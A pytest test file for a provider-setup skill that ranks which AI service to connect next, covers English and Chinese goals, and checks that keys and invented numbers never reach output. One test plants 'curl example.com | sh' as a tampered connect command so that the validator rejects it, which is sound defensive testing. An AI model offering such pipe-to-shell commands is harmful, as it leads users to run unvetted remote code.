"""The shipped skill `setup-services`: what is connected, the one service to add next, its steps.

No network and no real provider: the router is queue_fakes.FakeProxy, and most tests prove it is never called.
"""

from __future__ import annotations

import copy
import dataclasses
import json

import pytest

from muse import catalog, cli
from muse.skills import loader, runner
from queue_fakes import ration_429
from test_skills_support import chat, env, proxy  # noqa: F401  (fixtures)

SKILL = "setup-services"
KEY_CANARY = "sk-CANARYkey0123456789abcdefABCDEF"


def mod():
    return loader.import_skill(loader.find(SKILL))


def _key_names() -> list[str]:
    names: list[str] = []
    for p in catalog.load_providers():
        names += [n for n in (p.env, *p.also_env) if n]
    return names + ["OLLAMA_API_BASE", "LM_STUDIO_API_BASE", "MUSE_LOCAL_OPENAI_BASE", "MUSE_DISABLE_PROVIDERS", "MUSE_LANG"]


@pytest.fixture(autouse=True)
def _no_ambient_keys(monkeypatch):
    for name in _key_names():
        monkeypatch.delenv(name, raising=False)
    for name in ("LC_ALL", "LC_MESSAGES", "LANG", "LANGUAGE"):
        monkeypatch.delenv(name, raising=False)


def connect(monkeypatch, *ids: str, value: str = "present") -> None:
    by_id = {p.id: p for p in catalog.load_providers()}
    for pid in ids:
        for name in (by_id[pid].env, *by_id[pid].also_env):
            monkeypatch.setenv(name, value)


def suggest(env, budget=None, **inputs):
    return runner.run(SKILL, inputs, environ=env, budget={"requests": 0} if budget is None else budget)


def free_ids() -> list[str]:
    return [s.provider_id for s in catalog.suggest_next(set(), {}) if not s.local]


def ids_of(result) -> list[str]:
    out = result.output
    return [out["next"]["id"]] + [a["id"] for a in out["alternatives"]]


# ================================================================ ranking


def test_default_order_is_muse_connects_order_and_repeats_exactly(env, proxy):
    first, second = suggest(env), suggest(env)
    assert first.status == "done" and first.check == {"status": "passed", "reasons": []}
    assert ids_of(first) == free_ids()[:3]
    assert first.output == second.output  # the same inputs give the same answer, byte for byte
    assert first.used["requests"] == 0 and proxy.requests == []
    nxt = first.output["next"]
    assert nxt["connect"] == f"muse connect {nxt['id']}" and nxt["steps"] and nxt["steps"][0]["n"] == 1
    assert first.output["connected"] == [] and "Nothing is connected yet." in first.output["text"]
    assert len(first.output["alternatives"]) == 2


def test_the_suggestion_follows_allowance_per_minute_after_one_tap(env, monkeypatch):
    connect(monkeypatch, "openrouter")
    out = suggest(env).output
    assert out["next"]["id"] == free_ids()[1]  # one tap gone: the best paste-a-key service
    assert [c["id"] for c in out["connected"]] == ["openrouter"]
    assert "Connected now (1): OpenRouter (Standard)." in out["text"]


def test_paid_only_and_local_are_left_out_unless_asked(env):
    providers = {p.id: p for p in catalog.load_providers()}
    paid = [p.id for p in providers.values() if not p.local and p.tier not in catalog.SUGGESTIBLE_TIERS and p.connection]
    assert paid, "the catalogue has paid entries to leave out"
    m = mod()
    cat = catalog.load_catalog()
    usual, _ = m.rank(cat, set(), {}, [], set())
    assert not {s.provider_id for s in usual} & set(paid) and not any(s.local for s in usual)
    with_paid, _ = m.rank(cat, set(), {}, [], {"paid"})
    assert [s.provider_id for s in with_paid][:len(usual)] == [s.provider_id for s in usual]  # free first, unchanged
    assert set(paid) <= {s.provider_id for s in with_paid}
    with_local, _ = m.rank(cat, set(), {}, [], {"local"})
    assert with_local[-1].local


def test_paid_suggestions_carry_the_charge_caveat_and_pass_the_check(env, monkeypatch):
    connect(monkeypatch, *free_ids())
    nothing = suggest(env)
    assert nothing.status == "done" and nothing.output["next"] is None and nothing.output["alternatives"] == []
    assert "already connected" in nothing.output["text"] and "include=paid" in nothing.output["text"]
    paid = suggest(env, include="paid")
    assert paid.status == "done" and paid.check["status"] == "passed"
    assert paid.output["next"]["tier"] not in catalog.SUGGESTIBLE_TIERS
    assert any("charges for use" in c for c in paid.output["next"]["caveats"])
    assert paid.output["next"]["gain"] is None and "allowance not confirmed" in paid.output["next"]["why"].lower()


def test_already_connected_services_are_never_suggested(env, monkeypatch):
    order = free_ids()
    for count in range(len(order)):
        connect(monkeypatch, *order[:count])
        result = suggest(env)
        assert result.check["status"] == "passed"
        assert not set(ids_of(result)) & set(order[:count])
        assert {c["id"] for c in result.output["connected"]} == set(order[:count])


def test_a_local_runtime_counts_as_connected(env, monkeypatch):
    monkeypatch.setenv("OLLAMA_API_BASE", "http://127.0.0.1:11434")
    result = suggest(env, goal="private")
    assert result.check["status"] == "passed"
    assert result.output["connected"][-1]["id"] == "local" and result.output["connected"][-1]["badge"] == "on_device"
    assert "local" not in ids_of(result)  # nothing to add there any more


# ================================================================ goals


@pytest.mark.parametrize("goal, tags", [
    ("long documents", ["long_documents"]),
    ("I read long PDFs", ["long_documents"]),
    ("長篇文件", ["long_documents"]),
    ("我想讀很長的報告", ["long_documents"]),
    ("faster", ["quick_answers"]),
    ("回答要快", ["quick_answers"]),
    ("private", ["private"]),
    ("隱私", ["private"]),
    ("不要訓練我的資料", ["private"]),
    ("search my files", ["embeddings"]),
    ("搜尋我的檔案", ["embeddings"]),
    ("no credit card", ["no_card"]),
    ("免信用卡", ["no_card"]),
    ("fast and private", ["quick_answers", "private"]),
    ("更多額度", ["more"]),
    ("knitting patterns", []),
    ("", []),
    ("belong", []),  # "long" inside another word does not count
])
def test_goal_words_in_both_languages(goal, tags):
    assert mod().match_goal(goal) == tags


def test_a_goal_moves_fitting_services_forward_in_a_stable_order(env):
    usual = free_ids()
    providers = {p.id: p for p in catalog.load_providers()}
    for goal, tag in (("long documents", "long_documents"), ("faster answers", "quick_answers"), ("search my files", "embeddings")):
        result = suggest(env, goal=goal)
        assert result.status == "done" and result.output["goal_tags"] == [tag]
        fits = [i for i in usual if tag in providers[i].good_for]
        expected = (fits + [i for i in usual if i not in fits])[:3]
        assert ids_of(result) == expected  # fitting ones first, each group in the usual order
        assert suggest(env, goal=goal).output == result.output
        if tag in providers[expected[0]].good_for:
            assert "Good for what you asked" in result.output["next"]["why"]


def test_the_same_goal_in_chinese_gives_the_same_services_in_chinese(env, proxy):
    english, chinese = suggest(env, goal="long documents"), suggest(env, goal="長篇文件")
    assert ids_of(chinese) == ids_of(english)
    out = chinese.output
    assert out["lang"] == "zh-TW" and out["next"]["steps_lang"] == "zh-TW" and chinese.check["status"] == "passed"
    assert "建議下一個新增" in out["text"] and "適合你提到的用途：長篇文件" in out["next"]["why"]
    assert out["next"]["steps"][0]["title"] != english.output["next"]["steps"][0]["title"]
    assert suggest(env, goal="long documents", lang="zh-TW").output["lang"] == "zh-TW"
    assert suggest(env, goal="長篇文件", lang="en").output["lang"] == "en"
    assert proxy.requests == []


def test_a_private_goal_puts_this_computer_first_then_services_that_do_not_train(env):
    for goal in ("private", "隱私"):
        result = suggest(env, goal=goal)
        out = result.output
        assert result.status == "done" and out["next"]["id"] == "local" and out["next"]["badge"] == "on_device"
        assert out["next"]["connect"] == "muse connect local" and len(out["next"]["steps"]) == 2
        providers = {p.id: p for p in catalog.load_providers()}
        second = providers[out["alternatives"][0]["id"]]
        assert second.policy.get("trains_on_inputs") is False  # the catalogue says so; nothing is guessed
        assert out["alternatives"][0]["badge"] == "standard"  # human review is not confirmed, so not "private"
    assert suggest(env).output["next"]["id"] != "local"  # never without being asked


def test_a_goal_the_catalogue_cannot_tell_services_apart_by_says_so(env):
    result = suggest(env, goal="no credit card")
    assert result.status == "done" and ids_of(result) == free_ids()[:3]
    assert any("does not tell these services apart" in n for n in result.notes)
    assert "Card: not confirmed." in result.output["text"]


# ================================================================ the one model call


def test_no_model_is_used_when_the_budget_is_zero_even_for_an_unknown_goal(env, proxy):
    result = suggest(env, goal="knitting patterns")
    assert result.status == "done" and result.check["status"] == "passed"
    assert result.used["requests"] == 0 and proxy.requests == []
    assert ids_of(result) == free_ids()[:3] and result.output["next"]["why_goal"] == ""
    assert any("does not rank by that goal" in n for n in result.notes)


def test_an_unknown_goal_gets_one_light_call_for_a_reason_and_the_order_stays(env, proxy):
    proxy.script.append(chat("Nothing in these facts shows it helps with knitting.", task="light"))
    result = suggest(env, budget={}, goal="knitting patterns")
    assert result.status == "done" and result.check["status"] == "passed"
    assert len(proxy.requests) == 1 and proxy.requests[0]["task"] == "light"
    assert result.output["next"]["why_goal"] == "Nothing in these facts shows it helps with knitting."
    assert "Nothing in these facts shows it helps with knitting." in result.output["text"]
    assert ids_of(result) == free_ids()[:3]
    assert "knitting patterns" in proxy.requests[0]["prompt"]


def test_a_known_goal_never_calls_a_model_even_with_budget(env, proxy):
    for goal in ("long documents", "隱私", "faster", ""):
        assert suggest(env, budget={}, goal=goal).status == "done"
    assert suggest(env, budget={}, goal="knitting", phrase="off").status == "done"
    assert proxy.requests == []


@pytest.mark.parametrize("reply", [
    "It adds 99999 requests a day for knitting.",  # a number that is not in the catalogue entry
    f"Use the key {KEY_CANARY} to start.",  # key-shaped
    "See https://example.com/knitting for more.",  # a link of its own
    "word " * 80,  # too long
    "   ",
])
def test_a_reason_the_model_got_wrong_is_dropped_not_shown(env, proxy, reply):
    proxy.script.append(chat(reply, task="light"))
    result = suggest(env, budget={}, goal="knitting patterns")
    assert result.status == "done" and result.check["status"] == "passed"
    assert result.output["next"]["why_goal"] == ""
    assert reply.strip()[:20] not in result.output["text"] or not reply.strip()


def test_a_router_that_holds_the_call_back_does_not_stop_the_answer(env, proxy):
    proxy.script.append(ration_429())
    result = suggest(env, budget={}, goal="knitting patterns")
    assert result.status == "done" and result.output["next"]["why_goal"] == "" and len(proxy.requests) == 1


# ================================================================ numbers, language, secrets


def _entry_numbers_ok(m, out) -> None:
    providers = {p.id: p for p in catalog.load_providers()}
    for item in [out["next"]] + out["alternatives"] if out["next"] else []:
        allowed = m.allowed_numbers(providers.get(item["id"]), len(item["steps"]))
        raw = json.dumps(providers[item["id"]].raw, default=str, ensure_ascii=False) if item["id"] in providers else ""
        for run in m.digit_runs(m.entry_text(item, out["lang"])):
            in_entry = run in m.digit_runs(raw)
            labelled = run in {str(s["n"]) for s in item["steps"]} | {str(len(item["steps"]))}  # step numbers, their count
            assert in_entry or labelled, f"{item['id']}: {run} is neither in the catalogue entry nor a labelled count"
            assert run in allowed
    names = " ".join(c["name"] for c in out["connected"])
    assert m.digit_runs(out["connected_text"]) <= m.digit_runs(names) | {str(len(out["connected"]))}


def test_every_number_shown_is_in_the_catalogue_entry_or_is_a_labelled_count(env, monkeypatch):
    m = mod()
    order = free_ids()
    seen = 0
    for count in range(len(order) + 1):
        connect(monkeypatch, *order[:count])
        for inputs in ({}, {"lang": "zh-TW"}, {"goal": "long documents"}, {"goal": "隱私"}, {"include": "paid,local"},
                       {"goal": "faster", "include": "paid", "lang": "zh-TW"}):
            result = suggest(env, **inputs)
            assert result.check["status"] == "passed", result.check
            _entry_numbers_ok(m, result.output)
            seen += 1
    assert seen >= 30
    assert m.digit_runs("adds 1,000,000 tokens, 50 a day, 2026-11-12") == {"1000000", "50", "2026", "11", "12"}


def test_allowance_is_quoted_only_where_the_catalogue_has_a_verified_number(env):
    providers = {p.id: p for p in catalog.load_providers()}
    result = suggest(env, include="paid")
    m = mod()
    cat = catalog.load_catalog()
    ranked, _ = m.rank(cat, set(), {}, [], {"paid"})
    for lang in catalog.LANGS:
        for s in ranked:
            item = m.entry(cat, s, [], lang)
            head = providers[item["id"]].headline()
            if item["gain"] is None:
                assert item["gain_text"] == catalog.tr("gain_unknown", lang)
                assert any(c == m.t("cav_gain", lang) for c in item["caveats"])
            else:
                assert head is not None and item["gain"]["limit"] == head.limit and catalog.fmt_number(head.limit) in item["why"]
    assert result.status == "done"


def _without_chinese(monkeypatch, pid: str):
    """The real catalogue, with the Traditional Chinese side of one service's steps removed."""
    real = catalog.load_catalog()
    changed = []
    for p in real.providers:
        if p.id == pid:
            raw = copy.deepcopy(p.raw)
            for step in raw["connection"]["steps"]:
                step["title"].pop("zh-TW", None)
                step["detail"].pop("zh-TW", None)
            p = catalog.provider_from_dict(raw)
        changed.append(p)
    fake = dataclasses.replace(real, providers=tuple(changed))
    monkeypatch.setattr(catalog, "load_catalog", lambda *a, **k: fake)
    return fake


def test_steps_fall_back_to_english_with_a_note_when_the_guide_has_no_chinese(env, monkeypatch):
    first = free_ids()[0]
    _without_chinese(monkeypatch, first)
    result = suggest(env, lang="zh-TW")
    out = result.output
    assert result.status == "done" and result.check["status"] == "passed"
    assert out["next"]["id"] == first and out["next"]["steps_lang"] == "en" and out["steps_fallback"] == [first]
    assert all(step["title"].isascii() for step in out["next"]["steps"])  # never half and half
    assert "以下步驟以英文顯示" in out["text"] and any("以英文顯示" in n for n in result.notes)
    assert out["alternatives"][0]["steps_lang"] == "zh-TW"
    english = suggest(env, lang="en")
    assert english.output["steps_fallback"] == [] and english.notes == []


def test_a_key_on_this_home_never_reaches_the_answer_the_notes_or_the_events(env, monkeypatch, proxy):
    connect(monkeypatch, *free_ids()[:2], value=KEY_CANARY)
    proxy.script.append(chat("It is a general service.", task="light"))
    result = suggest(env, budget={}, goal="knitting patterns")
    assert result.status == "done" and len(result.output["connected"]) == 2
    everything = json.dumps(result.public(), ensure_ascii=False, default=str)
    assert KEY_CANARY not in everything and "sk-CANARY" not in everything
    assert KEY_CANARY not in json.dumps(proxy.requests[0]["body"])
    assert not catalog.find_secretlike(result.output)


def test_a_goal_that_is_a_key_is_refused_and_not_echoed(env, proxy):
    result = suggest(env, budget={}, goal=KEY_CANARY)
    assert result.status == "failed" and result.output is None and proxy.requests == []
    assert KEY_CANARY not in json.dumps(result.public(), default=str)
    assert suggest(env, include="everything").status == "failed"
    assert suggest(env, goal="x" * 400).status == "failed"


# ================================================================ the check


def good(env) -> dict:
    return copy.deepcopy(suggest(env).output)


def test_the_check_passes_what_the_skill_made_and_names_what_is_wrong(env, monkeypatch):
    m = mod()
    assert m.check(good(env)) == []
    assert m.check(None) and m.check({"lang": "en"})

    out = good(env)
    out["next"]["id"] = "nowhere"
    assert any("not in the catalogue" in r for r in m.check(out))

    out = good(env)
    out["next"]["why"] += " Adds 123456 requests a day."
    out["text"] = m.render(out)
    assert any("number(s) shown are not in its catalogue entry" in r for r in m.check(out))

    out = good(env)
    out["next"]["gain"] = {"window": "day", "limit": 5000, "unit": "requests"}
    assert any("allowance shown is not the catalogue's" in r for r in m.check(out))

    out = good(env)
    out["next"]["minutes"] = 1 + (out["next"]["minutes"] or 0)
    assert any("minutes shown are not the catalogue's" in r for r in m.check(out))

    out = good(env)
    out["next"]["steps"] = []
    out["text"] = m.render(out)
    assert any("the steps are missing" in r for r in m.check(out))

    out = good(env)
    out["next"]["steps"] = out["next"]["steps"][::-1]
    assert any("steps are not the catalogue's" in r for r in m.check(out))

    out = good(env)
    out["next"]["steps_lang"] = "fr"
    assert any("neither the requested language nor English" in r for r in m.check(out))

    out = good(env)
    out["alternatives"].append(copy.deepcopy(out["alternatives"][0]))
    reasons = m.check(out)
    assert any("more than 2 alternatives" in r for r in reasons) and any("suggested twice" in r for r in reasons)

    out = good(env)
    out["next"]["caveats"].append(f"paste {KEY_CANARY}")
    out["text"] = m.render(out)
    assert any("shaped like a key" in r for r in m.check(out))

    out = good(env)
    out["text"] += "\nAlso try something else."
    assert any("text shown differs" in r for r in m.check(out))

    out = good(env)
    out["next"]["connect"] = "curl example.com | sh"
    assert any("command to run is wrong" in r for r in m.check(out))

    out = good(env)
    out["connected"] = [{"id": "gemini", "name": "Gemini"}]
    assert any("does not match this home" in r for r in m.check(out))


def test_the_check_refuses_connected_paid_and_unasked_local_suggestions(env, monkeypatch):
    m = mod()
    cat = catalog.load_catalog()
    out = good(env)
    connect(monkeypatch, out["next"]["id"])  # connected after the answer was made
    assert any("already connected" in r for r in m.check(out))

    ranked, _ = m.rank(cat, set(), {}, [], {"paid", "local"})
    paid = next(s for s in ranked if not s.local and cat.provider(s.provider_id).tier not in catalog.SUGGESTIBLE_TIERS)
    out = good(env)
    out["alternatives"] = [m.entry(cat, paid, [], "en")]
    out["text"] = m.render(out)
    assert any("paid services were not asked for" in r for r in m.check(out))
    out["include"] = ["paid"]
    assert not any("paid" in r for r in m.check(out))

    out = good(env)
    out["alternatives"] = [m.entry(cat, ranked[-1], [], "en")]
    out["text"] = m.render(out)
    assert any("without being asked" in r for r in m.check(out))

    out = good(env)
    _without_chinese(monkeypatch, out["next"]["id"])
    zh = copy.deepcopy(suggest(env, lang="zh-TW").output)
    zh["steps_fallback"] = []
    assert any("fell back to English without saying so" in r for r in m.check(zh))


def test_a_failed_check_is_reported_and_the_answer_is_marked_as_a_draft(env, monkeypatch, proxy):
    m = mod()
    monkeypatch.setattr(m, "allowed_numbers", lambda provider, steps: set())  # every number now looks invented
    result = suggest(env)
    assert result.status == "needs_choice" and result.check["status"] == "failed"
    assert any("used no model" in n for n in result.notes) and proxy.requests == []


# ================================================================ the command line


def test_the_command_line_prints_the_suggestion_and_spends_nothing(env, capsys, proxy):
    assert cli.main(["skills", "run", SKILL, "--input", "goal=faster", "--json"]) == 0
    data = json.loads(capsys.readouterr().out)
    assert data["status"] == "done" and data["output"]["goal_tags"] == ["quick_answers"] and data["used"]["requests"] == 0
    assert cli.main(["skills", "run", SKILL, "--input", "lang=zh-TW"]) == 0
    printed = capsys.readouterr()
    assert "建議下一個新增" in printed.out and "No model was used. Nothing spent." in printed.err
    assert cli.main(["skills", "show", SKILL]) == 0
    assert "never" in capsys.readouterr().out
    assert proxy.requests == []
